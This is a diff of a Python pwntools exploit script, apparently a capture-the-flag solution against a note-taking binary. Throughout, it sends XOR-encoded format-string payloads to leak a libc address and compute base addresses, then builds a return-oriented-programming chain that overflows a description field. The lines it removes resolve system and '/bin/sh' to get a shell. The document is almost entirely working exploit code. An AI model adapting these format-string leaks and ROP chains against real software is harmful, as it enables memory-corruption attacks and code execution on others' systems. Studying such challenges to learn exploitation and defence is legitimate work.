@@ -60,65 +60,35 @@ def main():
     get_secret_menu(p)
     
     #======== STEP 2 ============
-    #leaking some usefull addresses
-    #leaking libc
+    #leaking libc address
 
     payload = b"%1$p|%2$p|%3$p|%4$p|"
     xored_payload = xor_payload(payload)
     p.sendlineafter("Note: ", xored_payload)
-    leak = p.recvuntil(b"|", drop=True)
-
-    leak = int(leak, 16)
-    log.info(f"leak :{hex(leak)}")
-
-    libc_base = leak - 0x3ed8d0
+    libc_leak = p.recvuntil(b"|", drop=True)
+    libc_leak = int(libc_leak, 16)
+    log.info(f"Libc leak: {hex(libc_leak)}")
+    
+    libc_base = libc_leak - 0x3ed8d0
     libc.address = libc_base 
-    log.info(f"libc base : {hex(libc_base)}")
-    p.sendlineafter("Description: ", "AAA")
-
-    #leaking binary address
-
-    get_secret_menu(p)
-
-    payload = b"%25$p|%26$p"
-    xored_payload = xor_payload(payload)
-
-    p.sendlineafter("Note: ", xored_payload)
-
-    binary_leak = p.recvuntil(b"|", drop=True)
-    binary_leak = int(binary_leak, 16)
-    log.info(f"binary leak: {hex(binary_leak)}")
-
-    binary_base = binary_leak - 0x2ec
-    log.info(f"binary base: {hex(binary_base)}")
-
-    elf.address = binary_base
-    p.sendlineafter("Description: ", "AAAA")
-    #========= STEP 3 ========
-    #building ropchain
-    offset = 40
+    log.info(f"Libc base: {hex(libc_base)}")
+    p.sendlineafter("Description: ", "BB")
+    #========== STEP 3 ============
+    #building the rop chain
 
     rop = ROP(elf)
-    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
     ret = rop.find_gadget(["ret"]).address
-
-    bin_sh = next(libc.search(b'/bin/sh'))
-    system_addr = libc.symbols['system']
-    add_note = binary_base + 0x5ea
-    libc_start_main = libc_base + 0x21ab0
-
-    log.info(f"Libc start main: {hex(libc_start_main)}")
-    log.info(f"Ret gadget : {hex(ret)}")
+    add_note = 0x004015d7
+    
     ropchain = flat(
 
-        b"A" * (offset),
-        p64(libc_start_main)
+        b"A" * 40, 
+        p64(ret),
+        p64(add_note)
     )
 
-
-
     get_secret_menu(p)
-    p.sendlineafter("Note: ", "AAA")
+    p.sendlineafter("Note: ", "AA")
     p.sendlineafter("Description: ", ropchain)
 
     data = p.recv()
